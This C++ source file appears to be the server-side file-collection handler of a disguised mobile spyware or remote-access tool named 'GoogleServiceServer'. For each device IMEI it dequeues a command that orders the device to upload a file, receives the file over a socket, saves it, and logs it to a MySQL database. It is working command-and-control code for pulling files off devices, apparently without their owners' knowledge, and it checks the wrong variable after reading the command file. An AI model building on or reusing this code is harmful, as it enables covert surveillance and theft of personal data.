#include <windows.h>
#include "GoogleServiceServer.h"
#include "PublicFunction.h"
#include "Shlwapi.h"
#pragma comment( lib, "Shlwapi.lib")
#include "Additional.h"
#include "PacketMaker.h"
#include "DataProcess.h"
#include "Coder.h"
#include "FileWriter.h"
#include "CmdUploadFile.h"
#include "mysqlOper.h"
#include "FileOperator.h"

int CommandUploadFile::CmdUploadFile(char * lpUploadRecvBuf, LPDATAPROCESS_PARAM lpparam,char * imei,char * username){

	char errorbuf[1024];

	string cmdfn = Additional::getCmdFileName(lpparam->currentpath, UPLOADFILECOMMANDFILE, imei);

	char szCmd[MAX_MESSAGE_SIZE] = { 0 };

	DWORD dwFileSize = 0;

	int iRet = 0;

	dwFileSize = FileOperator::fileReader(cmdfn, szCmd, MAX_MESSAGE_SIZE);
	if (iRet == FALSE)
	{
		return FALSE;
	}
	DeleteFileA(cmdfn.c_str());

	char utf8cmd[MAX_MESSAGE_SIZE];
	iRet = Coder::GBKFNToUTF8FN(szCmd, utf8cmd, MAX_MESSAGE_SIZE);
	if (iRet == FALSE)
	{
		return FALSE;
	}

	char szData[MAX_MESSAGE_SIZE];
	int iLen = PacketMaker::hdrWithName(szData, CMD_UPLOADFILE, imei, utf8cmd);
	iRet = send(lpparam->sockclient,szData,iLen,0);
	if (iRet != iLen)
	{
		ErrorFormat(lpparam,errorbuf,"uploadfile send filename error",imei,username);
		WriteLogFile(errorbuf);
		return NETWORKERROR;;
	}

	int recvlen = recv(lpparam->sockclient,lpUploadRecvBuf,NETWORK_DATABUF_SIZE,0);
	if (recvlen < sizeof(COMMUNICATION_PACKET_HEADER) )
	{
		ErrorFormat(lpparam,errorbuf,"uploadfile recv first packet error",imei,username);
		WriteLogFile(errorbuf);
		return NETWORKERROR;
	}

	LPCOMMUNICATION_PACKET_HEADER lphdr = (LPCOMMUNICATION_PACKET_HEADER)lpUploadRecvBuf;
	DWORD dwCommand = lphdr->dwcmd;
	if (dwCommand == FILE_TRANSFER_NOT_FOUND)
	{
		ErrorFormat(lpparam,errorbuf,"uploadfile file not found error",imei,username);
		WriteLogFile(errorbuf);
		return FALSE;
	}
	else if (dwCommand == FILE_TRANSFER_TOO_BIG)
	{
		ErrorFormat(lpparam,errorbuf,"uploadfile file too big error",imei,username);
		WriteLogFile(errorbuf);
		return FALSE;
	}
	else if(dwCommand == CMD_UPLOADFILE)
	{
		char szLocalUploadFileName[MAX_PATH];
		lstrcpyA(szLocalUploadFileName,szCmd);
		PathStripPathA(szLocalUploadFileName);
		string localfn = Additional::getUploadFileName(lpparam->currentpath, szLocalUploadFileName);

		HANDLE hfuploadlocal = CreateFileA(localfn.c_str(),GENERIC_WRITE,0,0,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0);
		if (hfuploadlocal != INVALID_HANDLE_VALUE)
		{
			char * lpdata = lpUploadRecvBuf + sizeof(COMMUNICATION_PACKET_HEADER);
			int datablocksize = recvlen - sizeof(COMMUNICATION_PACKET_HEADER);

			DWORD dwCnt = 0;
			iRet = WriteFile(hfuploadlocal,lpdata,datablocksize,&dwCnt,0);

			int totalrecvsize = recvlen;

			int totaldatasize = lphdr->dwsize;

			while (totalrecvsize < totaldatasize)
			{
				recvlen = recv(lpparam->sockclient, lpUploadRecvBuf, NETWORK_DATABUF_SIZE, 0);
				if (recvlen > 0)
				{
					iRet = WriteFile(hfuploadlocal, lpUploadRecvBuf, recvlen, &dwCnt, 0);
					totalrecvsize += recvlen;
				}else if (recvlen == 0)
				{
					CloseHandle(hfuploadlocal);
					return NETWORKERROR;
				}
				else if (recvlen < 0)
				{
					//return 0 will be ok,because there is not data
					CloseHandle(hfuploadlocal);
					return NETWORKERROR;
				}
			}

			CloseHandle(hfuploadlocal);

			//iRet = DataProcess::DataNotify(localfn);
			MySql::enterLock();
			MySql * mysql = new MySql();
			__try {
				replaceSplash(localfn);
				mysql->insertUploadFile(imei, localfn);
			}
			__except (1) {

			}
			delete mysql;
			MySql::leaveLock();


			ErrorFormat(lpparam,errorbuf,"uploadfile ok",imei,username);
			WriteLogFile(errorbuf);

			return TRUE;
		}
		else {
			return NETWORKERROR;
		}
	}
	else
	{
		ErrorFormat(lpparam,errorbuf,"uploadfile error unkown",imei,username);
		WriteLogFile(errorbuf);
	}

	return FALSE;
}